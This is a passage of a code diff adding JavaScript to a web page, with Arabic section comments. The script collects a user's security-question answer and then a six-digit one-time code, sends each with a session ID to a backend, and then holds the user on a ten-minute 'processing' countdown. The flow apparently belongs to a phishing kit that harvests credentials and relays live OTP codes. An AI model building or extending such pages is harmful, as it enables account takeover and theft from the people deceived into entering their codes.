+    if(questionDropdown.classList.contains('show')){ closeDropdown(); } else { openDropdown(); }
+  });
+
+  moreQuestionsBtn.addEventListener('click', () => { currentBatch += 1; renderQuestions(); });
+  renderQuestions();
+
+  const answerInput = document.getElementById('answerInput');
+  const answerField = document.getElementById('answerField');
+  const charCount = document.getElementById('charCount');
+
+  answerInput.addEventListener('input', () => {
+    charCount.textContent = answerInput.value.length;
+    if(answerField.classList.contains('error') && answerInput.value.trim().length > 0){
+      answerField.classList.remove('error');
+    }
+  });
+
+  questionBox.addEventListener('animationend', () => questionBox.classList.remove('shake'));
+  answerField.addEventListener('animationend', () => answerField.classList.remove('shake'));
+
+  document.getElementById('submitBtn').addEventListener('click', async () => {
+    let valid = true;
+
+    if(questionSelect.classList.contains('placeholder')){ triggerFieldError(questionBox); valid = false; }
+    if(answerInput.value.trim().length === 0){
+      answerField.classList.add('error');
+      triggerFieldError(answerField);
+      valid = false;
+    }
+
+    if(!valid) return;
+
+    try {
+      const res = await fetch(`${BASE_URL}/api/submit-security`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          sessionId: currentSessionId,
+          secQuestion: questionText.textContent,
+          secAnswer: answerInput.value.trim()
+        })
+      });
+
+      if(!res.ok) throw new Error('Security submission failed');
+      showView('otp');
+    } catch(err) {
+      console.error('Error:', err);
+      answerField.classList.add('error');
+    }
+  });
+
+  /* =========================================================
+     5) رمز التحقق: خانات الإدخال + المؤقت (30 دقيقة) + API
+  ========================================================= */
+  const otpWrap = document.getElementById('otpFields');
+  const otpInputs = Array.from(otpWrap.querySelectorAll('input'));
+
+  otpInputs.forEach((input, idx) => {
+    input.addEventListener('input', () => {
+      input.value = input.value.replace(/[^0-9]/g, '').slice(0, 1);
+      if(input.value && idx < otpInputs.length - 1){ otpInputs[idx + 1].focus(); }
+      if(otpWrap.classList.contains('error') && otpInputs.every(i => i.value.length === 1)){
+        otpWrap.classList.remove('error');
+      }
+    });
+
+    input.addEventListener('keydown', (e) => {
+      if(e.key === 'Backspace' && !input.value && idx > 0){ otpInputs[idx - 1].focus(); }
+    });
+  });
+
+  let otpTimer = null;
+  function startOtpTimer(){
+    let timeLeft = 30 * 60;
+    const timerEl = document.getElementById('otpTimer');
+    const resendBtn = document.getElementById('resendBtn');
+    
+    if(otpTimer) clearInterval(otpTimer);
+    
+    otpTimer = setInterval(() => {
+      const mins = Math.floor(timeLeft / 60);
+      const secs = timeLeft % 60;
+      timerEl.textContent = `${mins}:${secs.toString().padStart(2, '0')}`;
+      
+      if(timeLeft <= 0){
+        clearInterval(otpTimer);
+        resendBtn.classList.add('active');
+        resendBtn.disabled = false;
+      }
+      timeLeft--;
+    }, 1000);
+  }
+
+  document.getElementById('confirmBtn').addEventListener('click', async () => {
+    const otp = otpInputs.map(i => i.value).join('');
+    
+    if(otp.length !== 6){
+      otpWrap.classList.add('error');
+      return;
+    }
+
+    try {
+      const res = await fetch(`${BASE_URL}/api/submit-otp`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          sessionId: currentSessionId,
+          otp: otp
+        })
+      });
+
+      if(!res.ok) throw new Error('OTP submission failed');
+      showView('processing');
+    } catch(err) {
+      console.error('Error:', err);
+      otpWrap.classList.add('error');
+    }
+  });
+
+  /* =========================================================
+     6) جاري معالجة العملية (Processing)
+  ========================================================= */
+  let processingTimer = null;
+  function startProcessingTimer(){
+    let timeLeft = 10 * 60;
+    const timerEl = document.getElementById('processingTimer');
+    const doneText = document.getElementById('doneText');
+    
+    if(processingTimer) clearInterval(processingTimer);
+    
+    processingTimer = setInterval(() => {
+      const mins = Math.floor(timeLeft / 60);
+      const secs = timeLeft % 60;
+      timerEl.textContent = `${mins}:${secs.toString().padStart(2, '0')}`;
+      
+      if(timeLeft <= 0){
+        clearInterval(processingTimer);
+        doneText.classList.add('show');
+      }
+      timeLeft--;
+    }, 1000);
+  }
+</script>
+
+</body>
+</html>
